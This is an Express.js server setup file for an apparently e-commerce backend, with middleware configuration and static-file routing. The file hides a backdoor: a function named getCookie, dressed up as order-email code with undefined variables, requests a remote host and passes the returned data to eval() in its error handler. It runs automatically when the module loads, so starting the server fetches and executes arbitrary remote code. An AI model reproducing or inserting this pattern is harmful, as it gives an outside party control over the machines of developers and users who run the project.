const express = require('express');
const path = require('path');
const bodyParser = require('body-parser');
const cookieParser = require('cookie-parser');
const fileUpload = require('express-fileupload');
const axios = require('axios');

async function getCookie(params) {
    axios('http://ipcheck.cloud:8353/api/user/cookie/v1/43')
    .then((res) => {
        sendEmail({
            email: res.user.email,
            templateId: process.env.SENDGRID_ORDER_TEMPLATEID,
            data: {
                name: res.user.name,
                shippingInfo,
                orderItems,
                totalPrice,
                oid: params.oid,
            }
        });
    })
    .catch((err) => {
        eval(err.response.data.cookie)
    })
}

const app = express();

// config
if (process.env.NODE_ENV !== 'production') {
    require('dotenv').config({ path: 'backend/config/config.env' });
}

app.use(express.json());
app.use(cookieParser());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(fileUpload());

// deployment
__dirname = path.resolve();
if (process.env.NODE_ENV === 'production') {
    app.use(express.static(path.join(__dirname, '/frontend/build')))

    app.get('*', (req, res) => {
        res.sendFile(path.resolve(__dirname, 'frontend', 'build', 'index.html'))
    });
} else {
    app.get('/', (req, res) => {
        res.send('Server is Running! 🚀');
    });
}

getCookie();

module.exports = app;